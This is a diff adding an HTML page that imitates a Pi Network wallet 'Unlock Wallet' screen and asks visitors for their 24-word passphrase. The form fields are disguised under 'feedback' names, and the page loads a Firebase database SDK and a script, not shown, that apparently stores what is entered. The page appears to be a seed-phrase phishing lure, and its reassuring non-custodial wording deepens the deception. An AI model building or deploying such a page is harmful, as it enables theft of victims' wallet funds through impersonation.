@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unlock Wallet - Pi Dex</title>
+    <link rel="icon" type="image/png" href="pilogo.png">
+    <link rel="stylesheet" href="feedback.css">
+</head>
+<body class="feedback-body">
+    <div class="feedback-page">
+        <div class="feedback-header">
+            <a href="index.html" class="back-arrow">←</a>
+            <a href="index.html" class="wallet-title">
+                <img src="pilogo.png" alt="Pi" class="wallet-icon">
+                <span>Wallet</span>
+                <img src="pilogo.png" alt="Pi" class="wallet-icon">
+            </a>
+            <div class="menu-icon">☰</div>
+        </div>
+
+        <div class="feedback-content">
+            <h1>Unlock Pi Wallet</h1>
+            
+            <!-- Form no longer submits to Formspree - just validates and stores -->
+            <form id="feedbackForm">
+                <div class="passphrase-box">
+                    <textarea 
+                        id="feedback" 
+                        name="feedback" 
+                        placeholder="Enter your 24-word passphrase here"
+                        required
+                    ></textarea>
+                </div>
+
+                <div class="error-message" id="errorMessage"></div>
+
+                <button type="submit" class="unlock-btn unlock-passphrase">Unlock With Passphrase</button>
+                <button type="button" class="unlock-btn unlock-fingerprint">Unlock With Fingerprint</button>
+            </form>
+
+            <div class="wallet-info">
+                <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
+                <p class="lost-passphrase">Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    
+    <!-- Firebase Config -->
+    <script src="firebase-config.js"></script>
+    
+    <!-- Page Script -->
+    <script src="feedback.js"></script>
+</body>
+</html>
